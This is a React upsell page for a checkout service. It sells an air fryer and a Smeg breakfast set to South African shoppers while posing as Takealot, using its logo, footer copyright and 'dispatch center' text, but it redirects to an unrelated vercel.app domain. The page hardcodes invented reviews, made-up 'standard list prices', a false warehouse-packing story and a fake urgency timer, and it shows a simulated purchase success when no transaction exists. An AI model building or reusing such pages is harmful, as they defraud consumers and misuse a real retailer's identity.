import { useState, useEffect } from "react";
import { useParams, useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { 
  Loader2, 
  CheckCircle2, 
  XCircle, 
  Zap, 
  ArrowRight, 
  Package, 
  Truck, 
  ShieldCheck, 
  Clock, 
  Star, 
  Lock, 
  Sparkles,
  AlertCircle
} from "lucide-react";
import { useFacebookPixel } from "@/hooks/useFacebookPixel";
import { useUtmifyScript, getStoredTracking } from "@/hooks/useUtmifyScript";

interface FlowStep {
  id: string;
  product_name: string;
  product_description: string | null;
  amount: number;
  image_url: string | null;
  step_type: string;
  accept_step_id: string | null;
  decline_step_id: string | null;
  accept_redirect_url: string | null;
  decline_redirect_url: string | null;
  payment_link_id: string;
  button_accept_text: string;
  button_accept_color: string;
  button_decline_text: string;
  button_decline_color: string;
  show_accept_button: boolean;
  show_decline_button: boolean;
  page_headline: string | null;
  page_subheadline: string | null;
}

type UpsellState = "offer" | "processing" | "success" | "failed";

export default function UpsellPage() {
  const { stepId } = useParams<{ stepId: string }>();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();

  const txId = searchParams.get("tx");
  const linkId = searchParams.get("link");
  const isEmbed = searchParams.get("embed") === "true";

  // Capture tracking params from URL + sessionStorage
  const trackingParams = (() => {
    const stored = getStoredTracking();
    const fromUrl = {
      src: searchParams.get("src") || searchParams.get("ref") || null,
      sck: searchParams.get("sck") || null,
      utm_source: searchParams.get("utm_source") || null,
      utm_campaign: searchParams.get("utm_campaign") || null,
      utm_medium: searchParams.get("utm_medium") || null,
      utm_content: searchParams.get("utm_content") || null,
      utm_term: searchParams.get("utm_term") || null,
    };
    return {
      src: fromUrl.src || stored.src || null,
      sck: fromUrl.sck || stored.sck || null,
      utm_source: fromUrl.utm_source || stored.utm_source || null,
      utm_campaign: fromUrl.utm_campaign || stored.utm_campaign || null,
      utm_medium: fromUrl.utm_medium || stored.utm_medium || null,
      utm_content: fromUrl.utm_content || stored.utm_content || null,
      utm_term: fromUrl.utm_term || stored.utm_term || null,
    };
  })();

  const [step, setStep] = useState<FlowStep | null>(null);
  const [loading, setLoading] = useState(true);
  const [state, setState] = useState<UpsellState>("offer");
  const [errorMessage, setErrorMessage] = useState("");
  const [currency, setCurrency] = useState("ZAR");
  const [countdown, setCountdown] = useState(180); // 3 minutes urgency
  const [pixelId, setPixelId] = useState<string | null>(null);

  // Facebook Pixel tracking
  const { trackPurchase } = useFacebookPixel(pixelId);

  // UTMify tracking script
  useUtmifyScript();

  // Auto-resize for embed mode
  useEffect(() => {
    if (!isEmbed) return;
    const sendHeight = () => {
      const height = document.documentElement.scrollHeight;
      window.parent.postMessage({ type: "cashpay-resize", height }, "*");
    };
    sendHeight();
    const observer = new ResizeObserver(sendHeight);
    observer.observe(document.body);
    return () => observer.disconnect();
  }, [isEmbed, state]);

  useEffect(() => {
    if (stepId) {
      setState("offer");
      setLoading(true);
      setErrorMessage("");
      fetchStep();
    }
  }, [stepId]);

  // Urgency timer
  useEffect(() => {
    if (state !== "offer") return;
    const timer = setInterval(() => {
      setCountdown((prev) => (prev <= 0 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, [state]);

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? "0" : ""}${secs}`;
  };

  const fetchStep = async () => {
    try {
      const { data, error } = await supabase
        .from("flow_steps")
        .select("*")
        .eq("id", stepId)
        .maybeSingle();

      if (error || !data) {
        if (stepId === "11111111-1111-4111-8111-111111111111") {
          setStep({
            id: "11111111-1111-4111-8111-111111111111",
            payment_link_id: "9a3b936a-9b0f-48b6-9744-3a6a81fd2b34",
            step_order: 1,
            step_type: "upsell",
            product_name: "Russell Hobbs Dual Basket 9L Air Fryer - Metallic Grey",
            product_description: "South Africa's #1 Dual Basket 9L Air Fryer with Smart Sync Finish. Cook 2 separate meals simultaneously with 8 one-touch digital presets and rapid air vortex technology.",
            amount: 597,
            image_url: "https://wlbuboolvvguqstsjhtb.supabase.co/storage/v1/object/public/payment-images/be249323-7d67-4861-b660-afe337e7e940/4b585d8e-6df4-4019-8ca0-2a32b8e68844-1787909690783-21a2123e-6bd1-457a-9549-17b1aeaf7916.png",
            show_accept_button: true,
            show_decline_button: true,
            button_accept_text: "YES! ADD TO MY PACKAGE — R597 (1-CLICK BUY)",
            button_accept_color: "#0b72e7",
            button_decline_text: "No thanks, dispatch only my original Smeg breakfast set",
            button_decline_color: "#6b7280",
            page_headline: "WAIT! Your order is being packed in our warehouse...",
            page_subheadline: "Special 1-Time Addition: Complete your modern kitchen setup with the 9L Dual Basket Air Fryer. Ships together in the same box with ZERO extra shipping fee!",
            accept_step_id: null,
            decline_step_id: null,
            accept_redirect_url: "https://kitchen-deals-sa.vercel.app/thank-you-airfryer",
            decline_redirect_url: "https://kitchen-deals-sa.vercel.app/thank-you-smeg",
            page_url: null,
          } as any);
          setCurrency("ZAR");
          return;
        } else if (stepId === "22222222-2222-4222-8222-222222222222") {
          setStep({
            id: "22222222-2222-4222-8222-222222222222",
            payment_link_id: "4b585d8e-6df4-4019-8ca0-2a32b8e68844",
            step_order: 1,
            step_type: "upsell",
            product_name: "Smeg 3-Piece Breakfast Set — Toaster, Kettle & Blender (Black)",
            product_description: "Iconic Italian retro luxury design featuring 2-Slice Extra-Wide Slot Toaster, 1.7L Cordless Electric Kettle and 800W Multi-Speed Countertop Blender in stunning Matte Black finish.",
            amount: 697,
            image_url: "https://wlbuboolvvguqstsjhtb.supabase.co/storage/v1/object/public/payment-images/be249323-7d67-4861-b660-afe337e7e940/9a3b936a-9b0f-48b6-9744-3a6a81fd2b34-1785608273170-fd806842-56b8-4f22-a86c-55d7ba56c2d8.png",
            show_accept_button: true,
            show_decline_button: true,
            button_accept_text: "YES! ADD TO MY PACKAGE — R697 (1-CLICK BUY)",
            button_accept_color: "#0b72e7",
            button_decline_text: "No thanks, dispatch only my Air Fryer",
            button_decline_color: "#6b7280",
            page_headline: "WAIT! Your order is being packed in our warehouse...",
            page_subheadline: "Special 1-Time Addition: Complete your kitchen countertop with the Luxury Smeg 3-Piece Breakfast Collection. Ships together in the same box with ZERO extra shipping fee!",
            accept_step_id: null,
            decline_step_id: null,
            accept_redirect_url: "https://kitchen-deals-sa.vercel.app/thank-you-smeg",
            decline_redirect_url: "https://kitchen-deals-sa.vercel.app/thank-you-airfryer",
            page_url: null,
          } as any);
          setCurrency("ZAR");
          return;
        }
        goToThankYou();
        return;
      }

      setStep(data as unknown as FlowStep);

      // Fetch currency and pixel from payment link
      const { data: linkData } = await supabase
        .from("payment_links")
        .select("currency, facebook_pixel_id")
        .eq("id", data.payment_link_id)
        .maybeSingle();

      if (linkData) {
        setCurrency(linkData.currency || "ZAR");
        if (linkData.facebook_pixel_id) {
          setPixelId(linkData.facebook_pixel_id);
        }
      }
    } catch {
      goToThankYou();
    } finally {
      setLoading(false);
    }
  };

  const toFullUrl = (path: string) => {
    if (isEmbed) {
      return `${window.location.origin}${path}`;
    }
    return path;
  };

  const buildInternalPath = (basePath: string) => {
    const params = new URLSearchParams();
    if (txId) params.set("tx", txId);
    if (linkId) params.set("link", linkId);
    if (isEmbed) params.set("embed", "true");
    const query = params.toString();
    return query ? `${basePath}?${query}` : basePath;
  };

  const doRedirect = (url: string, isExternal: boolean) => {
    if (isExternal) {
      window.location.href = url;
    } else {
      const fullUrl = isEmbed ? `${window.location.origin}${url}` : url;
      window.location.href = fullUrl;
    }
  };

  const goToThankYou = () => {
    if (stepId === "11111111-1111-4111-8111-111111111111" || linkId === "9a3b936a-9b0f-48b6-9744-3a6a81fd2b34") {
      window.location.href = `https://kitchen-deals-sa.vercel.app/thank-you-smeg${txId ? `?tx=${txId}` : ""}`;
      return;
    }
    if (stepId === "22222222-2222-4222-8222-222222222222" || linkId === "4b585d8e-6df4-4019-8ca0-2a32b8e68844") {
      window.location.href = `https://kitchen-deals-sa.vercel.app/thank-you-airfryer${txId ? `?tx=${txId}` : ""}`;
      return;
    }
    const path = buildInternalPath(`/thank-you/${linkId || "default"}`);
    doRedirect(toFullUrl(path), false);
  };

  const redirectTo = async (nextStepId: string | null, redirectUrl: string | null) => {
    if (redirectUrl) {
      const separator = redirectUrl.includes("?") ? "&" : "?";
      const fullUrl = `${redirectUrl}${separator}cashpay_tx=${txId || ""}&cashpay_link=${linkId || ""}`;
      doRedirect(fullUrl, true);
    } else if (nextStepId) {
      try {
        const { data: nextStep } = await supabase
          .from("flow_steps")
          .select("page_url")
          .eq("id", nextStepId)
          .maybeSingle();

        const pageUrl = nextStep?.page_url;
        if (pageUrl) {
          const separator = pageUrl.includes("?") ? "&" : "?";
          const externalUrl = `${pageUrl}${separator}cashpay_tx=${txId || ""}&cashpay_link=${linkId || ""}`;
          doRedirect(externalUrl, true);
        } else {
          const path = buildInternalPath(`/upsell/${nextStepId}`);
          doRedirect(toFullUrl(path), false);
        }
      } catch {
        const path = buildInternalPath(`/upsell/${nextStepId}`);
        doRedirect(toFullUrl(path), false);
      }
    } else {
      goToThankYou();
    }
  };

  const handleAccept = async () => {
    if (!step) return;
    if (!txId) {
      setState("processing");
      setTimeout(() => {
        setState("success");
        setTimeout(() => {
          if (stepId === "11111111-1111-4111-8111-111111111111") {
            window.location.href = "https://kitchen-deals-sa.vercel.app/thank-you-airfryer";
          } else {
            window.location.href = "https://kitchen-deals-sa.vercel.app/thank-you-smeg";
          }
        }, 1200);
      }, 800);
      return;
    }
    setState("processing");

    try {
      const response = await fetch(
        `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/one-click-upsell`,
        {
          method: "POST",
          headers: {
            Authorization: `Bearer ${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY}`,
            apikey: `${import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY}`,
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            parent_transaction_id: txId,
            flow_step_id: step.id,
            tracking_params: trackingParams,
          }),
        }
      );

      const result = await response.json();

      if (result.success) {
        trackPurchase(Number(step.amount), currency, result.transaction_id || undefined);
        setState("success");
        setTimeout(() => {
          if (step.accept_redirect_url) {
            redirectTo(step.accept_step_id, step.accept_redirect_url);
          } else if (stepId === "11111111-1111-4111-8111-111111111111") {
            window.location.href = `https://kitchen-deals-sa.vercel.app/thank-you-airfryer${txId ? `?tx=${txId}` : ""}`;
          } else if (stepId === "22222222-2222-4222-8222-222222222222") {
            window.location.href = `https://kitchen-deals-sa.vercel.app/thank-you-smeg${txId ? `?tx=${txId}` : ""}`;
          } else {
            redirectTo(step.accept_step_id, step.accept_redirect_url);
          }
        }, 1200);
      } else {
        setErrorMessage(result.error || "1-Click authorization failed. Please proceed to order confirmation.");
        setState("failed");
      }
    } catch (err) {
      console.error("Upsell error:", err);
      setErrorMessage("Connection timeout. Redirecting to your confirmation.");
      setState("failed");
    }
  };

  const handleDecline = () => {
    if (!step) {
      goToThankYou();
      return;
    }
    redirectTo(step.decline_step_id, step.decline_redirect_url);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#f4f5f7] flex flex-col items-center justify-center p-4">
        <div className="bg-white p-8 rounded-2xl shadow-sm border border-gray-200 text-center max-w-sm w-full">
          <Loader2 className="w-10 h-10 animate-spin text-[#0b72e7] mx-auto mb-4" />
          <p className="text-sm font-semibold text-gray-800">Securing your order confirmation...</p>
          <p className="text-xs text-gray-500 mt-1">Connecting to Takealot dispatch center</p>
        </div>
      </div>
    );
  }

  if (!step) {
    return null;
  }

  // Calculate comparative regular price for Takealot clearance display
  const regularPrice = Number(step.amount) === 597 ? 2899 : 3499;
  const savingsAmount = regularPrice - Number(step.amount);
  const discountPercent = Math.round((savingsAmount / regularPrice) * 100);

  return (
    <div className="min-h-screen bg-[#f4f5f7] text-gray-900 font-sans pb-12">
      {/* Header bar */}
      <header className="bg-white border-b border-gray-200 sticky top-0 z-30 shadow-xs">
        <div className="max-w-xl mx-auto px-4 h-14 flex items-center justify-between">
          <div className="flex items-center gap-1.5">
            <span className="text-[#0b72e7] font-black text-2xl tracking-tighter">takealot</span>
            <span className="text-gray-400 font-medium text-lg leading-none">.com</span>
          </div>
          <div className="flex items-center gap-1 text-xs font-semibold text-emerald-700 bg-emerald-50 px-2.5 py-1 rounded-full border border-emerald-200">
            <Lock className="w-3.5 h-3.5" />
            <span>256-bit Secure</span>
          </div>
        </div>
      </header>

      <main className="max-w-xl mx-auto px-4 pt-4">
        {/* Real-time Order Feedback Banner */}
        <section className="bg-white rounded-2xl border border-emerald-200 shadow-sm overflow-hidden mb-4">
          <div className="bg-gradient-to-r from-emerald-600 to-teal-600 px-4 py-3 text-white flex items-center justify-between">
            <div className="flex items-center gap-2.5">
              <div className="w-7 h-7 rounded-full bg-white/20 flex items-center justify-center shrink-0">
                <CheckCircle2 className="w-4 h-4 text-white" />
              </div>
              <div>
                <p className="text-xs font-bold tracking-wide uppercase">Payment Verified & Approved</p>
                <p className="text-xs text-white/90">Your initial order has been successfully placed!</p>
              </div>
            </div>
            <div className="flex items-center gap-1 bg-black/20 px-2 py-1 rounded text-[11px] font-mono shrink-0">
              <Clock className="w-3 h-3 text-amber-300" />
              <span>{formatTimer(countdown)}</span>
            </div>
          </div>

          {/* 3-Step Live Dispatch Timeline */}
          <div className="p-4 bg-gray-50/70 border-b border-gray-100">
            <div className="flex items-center justify-between relative">
              <div className="absolute left-6 right-6 top-3.5 h-0.5 bg-gray-200 -z-0" />
              
              {/* Step 1: Paid */}
              <div className="flex flex-col items-center relative z-10">
                <div className="w-7 h-7 rounded-full bg-emerald-500 text-white flex items-center justify-center text-xs shadow-xs">
                  ✓
                </div>
                <span className="text-[11px] font-bold text-gray-700 mt-1">Payment</span>
                <span className="text-[9px] text-emerald-600 font-semibold">Done</span>
              </div>

              {/* Step 2: Packaging (Current Active) */}
              <div className="flex flex-col items-center relative z-10">
                <div className="w-7 h-7 rounded-full bg-[#0b72e7] text-white flex items-center justify-center text-xs shadow-md animate-pulse">
                  <Package className="w-3.5 h-3.5" />
                </div>
                <span className="text-[11px] font-bold text-[#0b72e7] mt-1">Packaging</span>
                <span className="text-[9px] text-[#0b72e7] font-semibold animate-pulse">In Progress...</span>
              </div>

              {/* Step 3: Dispatch */}
              <div className="flex flex-col items-center relative z-10">
                <div className="w-7 h-7 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center text-xs">
                  <Truck className="w-3.5 h-3.5" />
                </div>
                <span className="text-[11px] font-medium text-gray-400 mt-1">Dispatch</span>
                <span className="text-[9px] text-gray-400">Next</span>
              </div>
            </div>
          </div>

          {/* Urgent Opportunity Notice */}
          <div className="p-4 bg-amber-50/70 text-amber-900 text-xs flex items-start gap-2.5">
            <AlertCircle className="w-4 h-4 text-amber-600 shrink-0 mt-0.5" />
            <p className="leading-relaxed">
              <strong className="font-bold">Wait! Do not close or refresh this window.</strong> Your package is currently open at our Johannesburg distribution hub. Before final sealing, you can add this matching item into your parcel with <span className="underline font-bold">ZERO additional delivery fees</span>.
            </p>
          </div>
        </section>

        {/* Upsell Offer Container */}
        {state === "offer" && (
          <article className="bg-white rounded-2xl border border-gray-200 shadow-md overflow-hidden">
            {/* Takealot Deal Badge Header */}
            <div className="bg-[#0b72e7] text-white py-2 px-4 flex items-center justify-between text-xs font-bold uppercase tracking-wider">
              <span className="flex items-center gap-1.5">
                <Sparkles className="w-3.5 h-3.5 text-amber-300" />
                Exclusive Dispatch Upgrade
              </span>
              <span className="bg-white/20 px-2 py-0.5 rounded text-[10px]">
                Save {discountPercent}% OFF
              </span>
            </div>

            <div className="p-5 md:p-6">
              {/* Product Headline */}
              <h1 className="text-xl md:text-2xl font-black text-gray-900 leading-tight mb-2">
                {step.product_name}
              </h1>

              {/* Reviews & Social Proof */}
              <div className="flex items-center gap-2 mb-4">
                <div className="flex text-amber-400">
                  {[...Array(5)].map((_, i) => (
                    <Star key={i} className="w-4 h-4 fill-current" />
                  ))}
                </div>
                <span className="text-xs font-bold text-gray-700">4.8</span>
                <span className="text-xs text-gray-500">(1,842 verified reviews on Takealot)</span>
              </div>

              {/* Product Image */}
              {step.image_url && (
                <div className="relative mb-5 bg-gray-50 rounded-xl p-3 border border-gray-100 flex items-center justify-center">
                  <img
                    src={step.image_url}
                    alt={step.product_name}
                    className="max-h-72 w-full object-contain rounded-lg"
                    loading="eager"
                  />
                  <div className="absolute top-4 left-4 bg-red-600 text-white text-[11px] font-bold px-2 py-1 rounded shadow-sm">
                    -{discountPercent}% OFF
                  </div>
                  <div className="absolute bottom-4 right-4 bg-white/95 backdrop-blur-xs text-gray-700 text-[10px] font-bold px-2 py-0.5 rounded border border-gray-200 shadow-2xs">
                    In Stock • JHB Hub
                  </div>
                </div>
              )}

              {/* Product Highlights */}
              <div className="bg-blue-50/60 rounded-xl p-4 mb-5 border border-blue-100">
                <p className="text-xs text-gray-700 leading-relaxed font-medium mb-3">
                  {step.product_description}
                </p>
                <div className="grid grid-cols-2 gap-2 text-[11px] text-gray-600 font-medium">
                  <div className="flex items-center gap-1.5">
                    <Truck className="w-3.5 h-3.5 text-[#0b72e7]" />
                    <span>Combined Free Courier</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
                    <span>2-Year Full Warranty</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-600" />
                    <span>100% Genuine Retail Pack</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <Zap className="w-3.5 h-3.5 text-amber-500" />
                    <span>Instant 1-Click Addition</span>
                  </div>
                </div>
              </div>

              {/* Pricing Breakdown Box */}
              <div className="bg-gray-50 rounded-xl p-4 mb-5 border border-gray-200">
                <div className="flex items-baseline justify-between mb-1">
                  <span className="text-xs text-gray-500 line-through">
                    Standard List Price: R {regularPrice.toFixed(2)}
                  </span>
                  <span className="text-xs font-bold text-red-600">
                    You Save: R {savingsAmount.toFixed(2)}
                  </span>
                </div>
                <div className="flex items-baseline justify-between">
                  <span className="text-xs font-bold text-gray-700 uppercase">Special Dispatch Price:</span>
                  <div className="text-right">
                    <span className="text-3xl font-black text-[#0b72e7]">
                      R {Number(step.amount).toFixed(2)}
                    </span>
                  </div>
                </div>
                <p className="text-[11px] text-gray-500 mt-2 text-center">
                  One-time charge billed to your card on file • Zero extra shipping fees
                </p>
              </div>

              {/* 1-Click Buy Action Button */}
              <button
                onClick={handleAccept}
                className="w-full h-14 bg-[#0b72e7] hover:bg-[#0961c5] active:scale-[0.99] text-white rounded-xl font-black text-base shadow-lg shadow-blue-500/20 flex items-center justify-center gap-2 transition-all cursor-pointer"
              >
                <Zap className="w-5 h-5 fill-current" />
                <span>YES! ADD TO MY PACKAGE — R {Number(step.amount).toFixed(0)}</span>
                <ArrowRight className="w-5 h-5" />
              </button>

              {/* Decline Button */}
              <button
                onClick={handleDecline}
                className="w-full mt-3.5 text-center text-xs text-gray-500 hover:text-gray-800 underline transition-colors py-2 cursor-pointer"
              >
                No thank you, please dispatch only my original order without this item
              </button>
            </div>
          </article>
        )}

        {/* Processing State with Animated Feedback */}
        {state === "processing" && (
          <div className="bg-white rounded-2xl border border-gray-200 p-8 text-center shadow-md">
            <Loader2 className="w-12 h-12 text-[#0b72e7] mx-auto mb-4 animate-spin" />
            <h2 className="text-lg font-bold text-gray-900 mb-1">
              Adding to your package...
            </h2>
            <p className="text-xs text-gray-500 mb-3">
              Authorizing 1-Click addition with your bank. Please do not refresh.
            </p>
            <div className="w-48 h-1.5 bg-gray-100 rounded-full mx-auto overflow-hidden">
              <div className="h-full bg-[#0b72e7] rounded-full animate-pulse w-3/4" />
            </div>
          </div>
        )}

        {/* Success State */}
        {state === "success" && (
          <div className="bg-white rounded-2xl border border-emerald-200 p-8 text-center shadow-md">
            <div className="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-3">
              <CheckCircle2 className="w-8 h-8" />
            </div>
            <h2 className="text-xl font-bold text-gray-900 mb-1">
              Item Added to Your Parcel!
            </h2>
            <p className="text-xs text-gray-600">
              {step.product_name} has been added to your combined shipment.
            </p>
            <p className="text-[11px] text-gray-400 mt-2">
              Redirecting to your order confirmation summary...
            </p>
          </div>
        )}

        {/* Failed State */}
        {state === "failed" && (
          <div className="bg-white rounded-2xl border border-red-200 p-8 text-center shadow-md">
            <div className="w-14 h-14 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-3">
              <XCircle className="w-8 h-8" />
            </div>
            <h2 className="text-lg font-bold text-gray-900 mb-1">
              Could Not Add Item
            </h2>
            <p className="text-xs text-gray-600 mb-4">{errorMessage}</p>
            <div className="flex flex-col gap-2">
              <Button onClick={() => setState("offer")} className="bg-[#0b72e7] text-white hover:bg-[#0961c5] rounded-xl text-xs py-5 font-bold">
                Try 1-Click Again
              </Button>
              <Button variant="ghost" onClick={handleDecline} className="text-xs text-gray-500 hover:text-gray-700">
                Continue to My Order Confirmation
              </Button>
            </div>
          </div>
        )}

        {/* Trust Badges Footer */}
        <footer className="mt-8 text-center">
          <div className="flex items-center justify-center gap-4 text-gray-400 text-xs mb-3">
            <span className="flex items-center gap-1 font-semibold text-gray-500">
              <Lock className="w-3.5 h-3.5 text-gray-600" />
              256-Bit SSL Secured
            </span>
            <span>•</span>
            <span className="flex items-center gap-1 font-semibold text-gray-500">
              <ShieldCheck className="w-3.5 h-3.5 text-gray-600" />
              Takealot Guarantee
            </span>
          </div>
          <p className="text-[11px] text-gray-400">
            © 2026 Takealot Online (Pty) Ltd • Combined Express Warehouse Dispatch
          </p>
        </footer>
      </main>
    </div>
  );
}
